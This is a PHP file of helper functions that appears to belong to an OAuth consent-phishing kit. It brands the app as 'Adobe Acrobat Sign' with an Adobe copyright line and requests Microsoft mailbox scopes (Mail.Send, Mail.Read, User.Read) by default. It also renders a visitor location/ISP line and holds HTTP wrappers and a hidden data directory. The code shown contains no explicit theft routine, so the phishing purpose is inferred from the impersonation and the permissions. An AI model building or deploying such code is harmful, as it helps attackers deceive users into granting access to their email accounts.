<?php
function getAppConfig() {
    $default = [
        'app_name' => 'Adobe Acrobat Sign',
        'copyright' => '© 2026 Adobe. All rights reserved.',
        'location' => 'United States',
        'isp' => 'Unknown',
    ];
    if (file_exists(APP_CONFIG_FILE)) {
        $data = @json_decode(file_get_contents(APP_CONFIG_FILE), true);
        if ($data) return array_merge($default, $data);
    }
    return $default;
}

function injectConfig($html) {
    $cfg = getAppConfig();
    $locText = "Location: {$cfg['location']} • ISP: {$cfg['isp']}";
    foreach ($cfg as $k => $v) {
        $html = str_replace('{{' . strtoupper($k) . '}}', $v, $html);
    }
    $html = str_replace('{{LOCATION_TEXT}}', $locText, $html);
    return $html;
}

function getScopes() {
    $default = ['Mail.Send', 'User.Read', 'Mail.Read'];
    if (file_exists(APP_PERMISSIONS_FILE)) {
        $data = @json_decode(file_get_contents(APP_PERMISSIONS_FILE), true);
        if ($data && !empty($data['scopes'])) {
            $default = $data['scopes'];
        }
    }
    return array_values(array_diff($default, RESERVED_SCOPES));
}

function httpPost($url, $data) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => is_string($data) ? $data : http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded'],
    ]);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['code' => $code, 'body' => $resp];
}

function httpGet($url, $headers = []) {
    $ch = curl_init($url);
    $h = ['Content-Type: application/json'];
    foreach ($headers as $k => $v) $h[] = "$k: $v";
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTPHEADER => $h,
    ]);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['code' => $code, 'body' => $resp];
}

function ensureDataDir() {
    if (!is_dir(DATA_DIR)) {
        mkdir(DATA_DIR, 0755, true);
    }
    if (!file_exists(DATA_DIR . '/.htaccess')) {
        file_put_contents(DATA_DIR . '/.htaccess', "Deny from all\n");
    }
}

function getBaseUrl() {
    $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $script = $_SERVER['SCRIPT_NAME'] ?? '';
    $base = dirname($script);
    if ($base === '/' || $base === '\\') $base = '';
    return $proto . '://' . $host . $base;
}
